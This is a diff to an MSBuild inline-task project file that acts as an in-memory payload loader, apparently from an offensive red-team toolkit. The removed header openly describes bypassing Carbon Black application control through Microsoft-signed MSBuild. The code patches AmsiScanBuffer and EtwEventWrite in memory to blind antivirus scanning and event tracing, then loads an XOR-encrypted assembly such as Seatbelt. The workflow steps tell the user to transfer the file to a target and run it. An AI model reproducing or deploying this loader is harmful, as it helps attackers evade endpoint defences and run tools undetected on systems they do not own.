@@ -1,20 +1,12 @@
+<?xml version="1.0" encoding="utf-8"?>
 <!--
-  MSBuild Inline Task — Bypasses Carbon Black App Control
-
-  MSBuild.exe is Microsoft-signed and ships with .NET Framework.
-  Carbon Black whitelists it. This XML file is not subject to app control
-  because it's data, not an executable.
+  MSBuild Inline Task
 
   Workflow:
-    1. python encrypt_payload.py xor YourTool.exe --format cs
-    2. Paste the byte arrays into the PAYLOAD SECTION below
-    3. Set the args in the ARGUMENTS SECTION
-    4. Transfer this .csproj to target
-    5. Run:
-       C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe msbuild_payload.csproj
-
-  The chain: MSBuild (whitelisted) → inline C# compile (in-memory) →
-  AMSI patch → ETW patch → Assembly.Load(decrypted bytes) → execute → cleanup
+    1. python build_msbuild.py YourTool.exe -- -your -args
+    2. Transfer the output .csproj to target
+    3. Run:
+       C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe msbuild_ready.csproj
 -->
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
   <Target Name="Execute">
@@ -57,7 +49,7 @@ public class InMemoryLoader : Task
     const uint PAGE_EXECUTE_READWRITE = 0x40;
 
     // ================================================================
-    //  AMSI Bypass — patch AmsiScanBuffer
+    //  AMSI Bypass
     // ================================================================
     static bool PatchAmsi()
     {
@@ -70,7 +62,7 @@ public class InMemoryLoader : Task
             IntPtr pScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
             if (pScanBuffer == IntPtr.Zero) return false;
 
-            // x64: mov eax, 0x80070057; ret → returns E_INVALIDARG
+            // x64: mov eax, 0x80070057; ret
             byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
 
             uint oldProtect;
@@ -88,7 +80,7 @@ public class InMemoryLoader : Task
     }
 
     // ================================================================
-    //  ETW Bypass — patch EtwEventWrite
+    //  ETW Bypass
     // ================================================================
     static bool PatchEtw()
     {
@@ -100,7 +92,7 @@ public class InMemoryLoader : Task
             IntPtr pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
             if (pEtwEventWrite == IntPtr.Zero) return false;
 
-            // x64: xor eax, eax; ret → returns STATUS_SUCCESS
+            // x64: xor eax, eax; ret
             byte[] patch = { 0x33, 0xC0, 0xC3 };
 
             uint oldProtect;
@@ -129,7 +121,7 @@ public class InMemoryLoader : Task
     }
 
     // ================================================================
-    //  PAYLOAD SECTION — paste from encrypt_payload.py
+    //  PAYLOAD SECTION
     // ================================================================
 
     // python encrypt_payload.py xor Seatbelt.exe --format cs
@@ -189,7 +181,7 @@ public class InMemoryLoader : Task
         }
         catch (TargetInvocationException ex)
         {
-            // The loaded assembly threw — print inner exception
+            // The loaded assembly threw - print inner exception
             Console.Error.WriteLine(ex.InnerException?.ToString());
         }
         catch (Exception ex)
